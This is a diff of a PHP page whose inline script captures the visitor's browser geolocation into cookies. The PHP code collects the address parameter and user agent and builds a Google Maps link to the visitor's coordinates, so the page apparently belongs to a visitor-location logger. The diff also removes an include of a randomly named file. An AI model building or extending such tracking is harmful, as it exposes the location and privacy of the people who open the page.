@@ -1,10 +1,5 @@
 <script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});document.cookie="a=1";</script>
 <?php
-$b = NULL;
-if ($b == "1"){
-include '7c79Yc656i31Ifg.php';
-header("Refresh:5");
-$b="2";}
 $lat = NULL;
 $lon = NULL;
 $a = NULL;
@@ -55,9 +50,7 @@ $ipa = $_GET['addr'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $hagent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
 $gagent = $HTTP_USER_AGENT;
-if ($a == NULL){
-header("Refresh:5");
-$b="1";}
+if ($a == NULL){header("Refresh:5");}
 echo serialize($msg)."<br /><br />";
 $google = "//maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
